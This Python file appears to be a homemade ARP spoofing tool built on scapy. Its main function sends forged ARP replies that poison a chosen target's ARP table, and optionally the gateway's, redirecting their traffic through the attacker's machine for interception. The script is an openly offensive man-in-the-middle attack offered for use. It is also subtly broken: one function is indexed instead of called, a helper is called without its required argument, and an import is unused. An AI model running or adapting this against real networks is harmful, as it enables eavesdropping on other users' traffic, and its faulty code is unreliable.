#!/usr/bin/python

import sys, getopt
from scapy.all import Ether , ARP,conf, get_if_addr , get_if_hwaddr,srp1,sendp
from time import sleep
from dhcpclient import DHCPClient
BROADCASTMAC = "ff:ff:ff:ff:ff:ff"
rep = False 
options = {
        "interface" :conf.iface,
        "delay" : 3 , 
        "attackGW" : None , 
        "target" : "127.0.0.1",
        "src": None , 
        "router" : None , 
        "mac ":None 
    } 
def getTargetMac(target : str)->str : 
    etherAttack = Ether(dst =BROADCASTMAC)
    arpAttack = ARP(pdst = target  , op = "who-has" )
    reply = srp1(etherAttack/arpAttack , iface = options["interface"],verbose=False)
    return reply[Ether].src

def changeArpTable( target : str , src :str , srcMac : str )->None:
    etherAttack = Ether(dst =getTargetMac(target) , src = srcMac)
    arpAttack = ARP(pdst = target , psrc = src, op = "is-at" )
    sendp(etherAttack/arpAttack , iface=options["interface"],verbose=False)
 

def main(argv :list )->None:
    '''
    usage: ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw]
            -t TARGET
    Spoof ARP tables
    optional arguments:
        -h, --help          show this help message and exit
        -i IFACE, --iface IFACE
                            Interface you wish to use
        -s SRC, --src SRC   The address you want for the attacker
        -d DELAY, --delay DELAY
                            Delay (in seconds) between messages
        -gw                 should GW be attacked as well
        -t TARGET, --target TARGET
                            IP of target
    '''

    try:
        opts, args = getopt.getopt(argv, "s:t:d:i:gw:h", [
                                    "src=","delay=","target=","iface=","getway","help"])
    except getopt.GetoptError as e:
        print(e)
        sys.exit(-1)
    for opt, arg in opts:
        print(opt,arg)
        if opt == '-h':
            print(main.__doc__)
            sys.exit()
        elif opt in ("-i", "--iface"):
            options["interface"] = arg
            #src = get_if_addr()
        elif opt in ("-s", "--src"):
            options["src"] = arg
        elif opt in ("-d", "--delay"):
            options["delay"] = arg
        elif opt in ("-gw", "--getway"):
            options["attackGW"] = True
        elif opt in ("-t", "--target"):
            options["target"] = arg

    if not options["src"]:
        options["src"]=  get_if_addr(options["interface"])
    options["router"] = next(filter(lambda x : x[3] == options["interface"] , dict(conf.route.__dict__)["routes"]))[2]
    options["mac"]=get_if_hwaddr[options["interface"]]
    targetMac= getTargetMac() 
    #the attack 
    changeArpTable(options["target"], options["router"] ,options["mac"] )
    if(options["attackGW"]):
        changeArpTable(options["router"] ,options["target"] , options["mac"] )
    #repiar to the attack 
 
if __name__ == "__main__":
    main(sys.argv[1:])


